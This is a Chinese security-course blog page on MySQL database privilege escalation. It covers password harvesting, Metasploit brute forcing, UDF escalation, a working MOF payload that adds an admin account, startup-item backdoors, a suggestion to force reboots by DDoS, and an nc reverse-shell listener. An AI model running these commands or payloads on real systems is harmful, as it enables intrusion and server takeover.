@@ -1,0 +1,387 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>60：权限提升-MY&amp;MS&amp;ORA等SQL数据库提权 | HVVL404</title><meta name="author" content="HVVL404"><meta name="copyright" content="HVVL404"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="60：权限提升-MY&amp;MS&amp;ORA等SQL数据库提权">
+<meta property="og:type" content="article">
+<meta property="og:title" content="60：权限提升-MY&amp;MS&amp;ORA等SQL数据库提权">
+<meta property="og:url" content="http://blog.hvvl404.fun/2023/06/05/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-MY&MS&ORA%E7%AD%89SQL%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/index.html">
+<meta property="og:site_name" content="HVVL404">
+<meta property="og:description" content="60：权限提升-MY&amp;MS&amp;ORA等SQL数据库提权">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://blog.hvvl404.fun/images/avatar.png">
+<meta property="article:published_time" content="2023-06-05T14:37:01.209Z">
+<meta property="article:modified_time" content="2023-06-05T15:00:48.922Z">
+<meta property="article:author" content="HVVL404">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://blog.hvvl404.fun/images/avatar.png"><link rel="shortcut icon" href="/images/hacker.png"><link rel="canonical" href="http://blog.hvvl404.fun/2023/06/05/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-MY&amp;MS&amp;ORA%E7%AD%89SQL%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '60：权限提升-MY&MS&ORA等SQL数据库提权',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2023-06-05 23:00:48'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/style.css?1"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Zfour/Butterfly-double-row-display@1.00/cardlistpost.min.css"/>
+<style>#recent-posts > .recent-post-item >.recent-post-info > .article-meta-wrap > .tags:before {content:"\A";
+  white-space: pre;}#recent-posts > .recent-post-item >.recent-post-info > .article-meta-wrap > .tags > .article-meta__separator{display:none}</style>
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="HVVL404" type="application/atom+xml">
+</head><body><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><div class="loading-img"></div><div class="loading-image-dot"></div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',()=> { preloader.endLoading() })
+
+if (false) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><script>window.paceOptions = {
+  restartOnPushState: false
+}
+
+document.addEventListener('pjax:send', () => {
+  Pace.restart()
+})
+</script><link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/xlenco/JS-X@main/pace.js/pace.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/images/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">60</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 站点</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 类别</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="HVVL404"><span class="site-name">HVVL404</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 站点</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 类别</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">60：权限提升-MY&amp;MS&amp;ORA等SQL数据库提权</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-06-05T14:37:01.209Z" title="发表于 2023-06-05 22:37:01">2023-06-05</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-06-05T15:00:48.922Z" title="更新于 2023-06-05 23:00:48">2023-06-05</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/">小迪安全（权限提升）</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="60：权限提升-MY&amp;MS&amp;ORA等SQL数据库提权"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div><article class="post-content" id="article-container"><p>60：权限提升-MY&amp;MS&amp;ORA等SQL数据库提权</p>
+<span id="more"></span>
+
+<p>思维导图</p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-1.png" alt="60-1"></p>
+<p>在利用系统溢出漏洞无果的情况下，可以采用数据库进行提权，但需要知道数据库提权的前提条件：服务器开启数据库服务以及获取到最高权限用户密码。除Access数据库外，其他数据库基本上都存在数据库提权的可能。</p>
+<p>本课重点：</p>
+<ul>
+<li>数据库应用提权在权限提升中的意义</li>
+<li>WEB或本地环境如何探针数据库应用</li>
+<li>数据库提权权限用户密码收集等方法</li>
+<li>目前数据库提权对应的技术及方法等</li>
+</ul>
+<p><strong>案例1：MySQL数据库提权演示-脚本&amp;MSF</strong></p>
+<p>环境准备：阿里云服务器，windows2012操作系统，php+mysql环境搭建，已上传后门并取得webshell权限</p>
+<p>流程：服务探针-信息收集-提权利用-获取权限</p>
+<p>1、服务探针</p>
+<p>连接webshell，对目标服务器进行端口扫描，发现开放了3306端口，说明服务器部署了MySQL数据库。</p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-2.png" alt="60-2"></p>
+<p>2、信息收集</p>
+<p>MySQL的最高权限的用户名为root，尝试获取root的密码。</p>
+<p>方法1：读取网站数据库配置文件</p>
+<p>这种方法的关键是了解其命名规则及查找技巧。可以重点查看带有关键字的配置文件，常见的关键字有sql、data、inc、config、conn、database、common、include等。</p>
+<p>举例1：database.php</p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-3.png" alt="60-3"></p>
+<p>举例2：config.inc.php</p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-4.png" alt="60-4"></p>
+<p>当然在实战中，即使你找到了配置文件，系统也不一定用的是root用户。</p>
+<p>方法2：读取数据库存储或备份文件</p>
+<p>首先，我们了解一下MySQL数据库存储格式及对应内容。</p>
+<p>@@basedir&#x2F;data&#x2F;数据库名&#x2F;表名.myd，表名.myd文件中的内容对应的就是表的内容</p>
+<p>举例1</p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-5.png" alt="60-5"></p>
+<p>举例2</p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-6.png" alt="60-6"></p>
+<p>查询用户名密码时，我们用到了如下SQL语句。</p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-7.png" alt="60-7"></p>
+<p>相应地，mysql.user对应的内容就存储在MySQLr&#x2F;data&#x2F;mysql&#x2F;user.myd文件中</p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-8.png" alt="60-8"></p>
+<p>打开user.myd文件，找到root用户名密码。</p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-9.png" alt="60-9"></p>
+<p>该密码使用MD5散列加密，网上存在丰富的彩虹表破解。</p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-10.png" alt="60-10"></p>
+<p>方法3：利用脚本暴力猜解</p>
+<p>获取数据库最高权限密码，一般我们使用前两种方法居多，如果前两种方法实在用不了，我们才考虑使用暴力猜解。暴力猜解之前，需要先了解数据库是否支持外联以及如何开启外联。</p>
+<ul>
+<li>若数据库支持外联，可以远程本地暴力猜解；</li>
+<li>若数据库不支持外联，可以服务器本地暴力猜解。</li>
+</ul>
+<p>但是，其实root账户一般是不支持外联的，所以没法使用工具进行本地暴力猜解，但是我们可以将脚本通过webshell上传到服务器，在服务器本地使用脚本暴力猜解。脚本可以从网上自行下载。</p>
+<p>演示</p>
+<p>&lt;1&gt;数据库支持外联，使用msf工具远程本地暴力猜解。相关命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search mysql</span><br><span class="line">use auxiliary/scanner/mysql/mysql_login</span><br><span class="line">show options</span><br><span class="line">set rhost 47.99.71.28</span><br><span class="line">set username root</span><br><span class="line">set pass_file /opt/mysql_pwd.txt</span><br><span class="line">show options</span><br><span class="line">exploit </span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-11.png" alt="60-11"></p>
+<p>&lt;2&gt;数据库不支持外联，使用脚本在服务器本地暴力猜解。</p>
+<p>网上搜了一个PHP版Mysql爆破小脚本，成功爆破出密码。</p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-12.png" alt="60-12"></p>
+<p>参考：<a target="_blank" rel="noopener" href="http://www.zzvips.com/article/79791.html">http://www.zzvips.com/article/79791.html</a></p>
+<p>3、提权利用</p>
+<p>3.1 UPF提权</p>
+<p>我们优先选择使用UDF提权。</p>
+<p>&lt;1&gt;获取mysql版本，确定导出目录。</p>
+<p>mysql版本不同，UDF导出目录也会有所不同。</p>
+<ul>
+<li>1.mysql&lt;5.1 导出到c:&#x2F;windows或system32目录</li>
+<li>2.mysql&gt;&#x3D;5.1 导出到安装目录&#x2F;lib&#x2F;plugin（mysql初始安装时，plugin目录默认不存在）。</li>
+</ul>
+<p>如下图，执行select version();语句，获取mysql版本为5.5.53。</p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-13.png" alt="60-13"></p>
+<p>如下图，执行select @@basedir;语句，获取mysql的安装路径。</p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-14.png" alt="60-14"></p>
+<p>可以直接进入安装目录&#x2F;lib&#x2F;下查看plugin是否存在（或者执行show variables like ‘%plugin%’;语句查看）</p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-15.png" alt="60-15"></p>
+<p>如果plugin目录不存在，需要手工创建plugin目录或利用NTFS流创建。</p>
+<p>&lt;2&gt;利用自定义执行函数导出dll文件进行命令执行</p>
+<p>在工具上，点击mysql提权进入配置页面，输入用户名密码，将可加载路径改为plugin下，后面的mysqlDLL.dll不变，点击安装DLL。</p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-16.png" alt="60-16"></p>
+<p>这个工具总是安装失败。试了好几次，都失败了。</p>
+<p>换个工具试试</p>
+<p>首先root连接</p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-17.png" alt="60-17"></p>
+<p>这个工具有个好处就是会自动帮你把plugin目录写上去，所以我们直接点击导出udf即可。如下图，导出成功。</p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-18.png" alt="60-18"></p>
+<p>然后使用自带命令创建cmdshell即可。如下图所示，创建成功。（如果创建失败的话，可以重启环境试试。失败原因猜测是集成在PHPstudy中的mysql问题）</p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-19.png" alt="60-19"></p>
+<p>接下来就可以 查看用户、查看权限、查看端口等。</p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-20.png" alt="60-20"></p>
+<p>后续还可以添加账户名密码，连接它的远程端口来实现控制服务器的目的。常用命令如下</p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-21.png" alt="60-21"></p>
+<p>简单来说，这个工具原理就是执行如下语句。</p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-22.png" alt="60-22"></p>
+<p>总结一下，UDF为User Defined  Function用户自定义函数，也就是支持用户自定义函数的功能。这里的自定义函数要以dll形式写成mysql的插件，提供给mysql来使用。也就是说我们可以通过编写dll文件来实现我们需要的功能。利用UDF提权需要知道root账户的密码，并且需要目标系统是Windows。可以使用现成的udf提权工具，也可以手工测试。</p>
+<p>3.2 MOF提权（基于MySQL特性的安全问题）</p>
+<p>导出自定义mof文件到系统目录加载</p>
+<p><strong>mof提权的原理：</strong></p>
+<p>mof是windows系统的一个文件（在c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;nullevt.mof）叫做”托管对象格式”其作用是每隔五秒就会去监控进程创建和死亡。其就是用又了mysql的root权限了以后，然后使用root权限去执行我们上传的mof。隔了一定时间以后这个mof就会被执行，这个mof当中有一段是vbs脚本，这个vbs大多数的是cmd的添加管理员用户的命令。</p>
+<p><strong>以下是mof提权的过程：</strong></p>
+<p>将mof上传至任意可读可写目录下，这里我传到C:&#x2F;phpStudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;目录下，命名为user_add.mof。</p>
+<p>然后使用sql语句将系统当中默认的nullevt.mof给替换掉。进而让系统执行我们这个恶意的mof文件。</p>
+<p>替换的sql语句：select load_file(‘C:&#x2F;phpStudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;user_add.mof’) into dumpfile ‘c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;nullevt.mof’;</p>
+<p>mof文件代码如下所示：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;) </span></span><br><span class="line"></span><br><span class="line">instance of __EventFilter as <span class="variable">$EventFilter</span> </span><br><span class="line">&#123; </span><br><span class="line">    EventNamespace = <span class="string">&quot;Root\\Cimv2&quot;</span>; </span><br><span class="line">    Name  = <span class="string">&quot;filtP2&quot;</span>; </span><br><span class="line">    Query = <span class="string">&quot;Select * From __InstanceModificationEvent &quot;</span> </span><br><span class="line">            <span class="string">&quot;Where TargetInstance Isa \&quot;</span>Win32_LocalTime\<span class="string">&quot; &quot;</span> </span><br><span class="line">            <span class="string">&quot;And TargetInstance.Second = 5&quot;</span>; </span><br><span class="line">    QueryLanguage = <span class="string">&quot;WQL&quot;</span>; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as <span class="variable">$Consumer</span> </span><br><span class="line">&#123; </span><br><span class="line">    Name = <span class="string">&quot;consPCSV2&quot;</span>; </span><br><span class="line">    ScriptingEngine = <span class="string">&quot;JScript&quot;</span>; </span><br><span class="line">    ScriptText = </span><br><span class="line">    <span class="string">&quot;var WSH = new ActiveXObject(\&quot;</span>WScript.Shell\<span class="string">&quot;)\nWSH.run(\&quot;</span>net.exe user admin admin /add\<span class="string">&quot;)&quot;</span>; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of __FilterToConsumerBinding </span><br><span class="line">&#123; </span><br><span class="line">    Consumer   = <span class="variable">$Consumer</span>; </span><br><span class="line">    <span class="keyword">Filter</span> = <span class="variable">$EventFilter</span>; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>可见其中是有一段添加用户的脚本。账号为admin 密码为admin</p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-23.png" alt="60-23"></p>
+<p>经过测试，这个方式成功率不高。</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/xishaonian/p/6384535.html">https://www.cnblogs.com/xishaonian/p/6384535.html</a></p>
+<p>3.3 启动项提权（基于配合操作系统自启动）</p>
+<p>导出自定义可执行文件到启动目录配合重启执行</p>
+<p>将创建好的后门或执行文件进行服务器启动项写入，配合重启执行！</p>
+<p>演示案例</p>
+<p>&lt;1&gt;如果mysql数据库没有开启外联，当我们拿到数据库最高权限后，可以执行SQL自行开启外联。</p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-24.png" alt="60-24"></p>
+<p>&lt;2&gt;使用msf提权，相关命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search mysql</span><br><span class="line">use exploit/windows/mysql/mysql_start_UP</span><br><span class="line">show options</span><br><span class="line">set rhost 12.34.56.78</span><br><span class="line">set username root</span><br><span class="line">set password root</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p>如下图所示，后门上传成功。</p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-25.png" alt="60-25"></p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-26.png" alt="60-26"></p>
+<p>&lt;3&gt;由于上传目录为启动目录，当服务器重启时，就会加载执行。那如何让服务器重启呢?一般就是DDS攻击。之后还可以使用Cobalt Strike渗透测试神器 继续。</p>
+<p>3.4 反弹shell提权（基于利用反弹特性命令执行）</p>
+<p>&lt;1&gt;首先，执行命令nc -l -p 5577监听端口</p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-27.png" alt="60-27"></p>
